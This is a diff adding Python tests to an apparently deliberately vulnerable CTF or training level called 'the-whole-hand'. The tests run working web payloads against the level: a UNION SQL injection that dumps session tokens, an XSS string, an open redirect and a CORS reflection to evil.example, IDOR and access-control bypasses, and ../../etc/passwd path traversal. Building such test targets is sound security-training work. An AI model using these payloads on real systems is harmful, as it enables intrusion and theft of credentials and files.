@@ -176,3 +176,50 @@ def test_the_annex_cross_database(monkeypatch, tmp_path):
     assert lv.flag().encode() in out
     main = "".join(r[0] for r in db.execute("SELECT value FROM secrets"))
     assert lv.flag() not in main                         # the flag is only in the ATTACHed db
+
+
+def _app(sub, cookie=None, headers=None, **q):
+    h = dict(headers or {})
+    if cookie:
+        h["Cookie"] = cookie
+    r = Request("GET", "/x", h, b"", ("127.0.0.1", 0))
+    r.query = dict(q)
+    r.subpath = sub
+    return r
+
+
+_ADMIN_TOK, _TELLER_TOK = "dw-admin-7f3a9c1e", "dw-teller-44c0a1b9"
+
+
+def test_the_whole_hand_heist_chain(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-whole-hand")
+    db = _db_for(lv)
+    # SQLi the directory, dump the sessions table -> a live admin token leaks
+    dump = lv.handle(_app("/directory", id="0 UNION SELECT username,token,role FROM sessions-- -"), db).body
+    assert _ADMIN_TOK.encode() in dump
+    # the vault gates on an admin session: none -> login, teller -> denied, admin -> the flag
+    assert b"Please sign in" in lv.handle(_app("/vault"), db).body
+    assert lv.handle(_app("/vault", cookie=f"session={_TELLER_TOK}"), db).status == 403
+    assert lv.flag().encode() in lv.handle(_app("/vault", cookie=f"session={_ADMIN_TOK}"), db).body
+
+
+def test_the_whole_hand_bac_and_idor(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-whole-hand")
+    db = _db_for(lv)
+    assert b"Daily Position" in lv.handle(_app("/admin", cookie=f"session={_TELLER_TOK}"), db).body   # BAC
+    assert lv.handle(_app("/admin-secure", cookie=f"session={_TELLER_TOK}"), db).status == 403         # control
+    assert b"Gold shipment" in lv.handle(_app("/orders/3", cookie=f"session={_TELLER_TOK}"), db).body  # IDOR
+
+
+def test_the_whole_hand_surface_vulns(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-whole-hand")
+    db = _db_for(lv)
+    assert b"<svg/onload=alert(1)>" in lv.handle(_app("/search", q="<svg/onload=alert(1)>"), db).body  # XSS
+    go = lv.handle(_app("/go", url="http://evil.example/"), db)
+    assert go.status == 302 and go.headers["Location"] == "http://evil.example/"                        # open redirect
+    cors = lv.handle(_app("/api/data", headers={"Origin": "http://evil.example"}), db)
+    assert cors.headers["Access-Control-Allow-Origin"] == "http://evil.example"                         # CORS
+    assert b"root:x:0:0" in lv.handle(_app("/download", file="../../etc/passwd"), db).body             # LFI
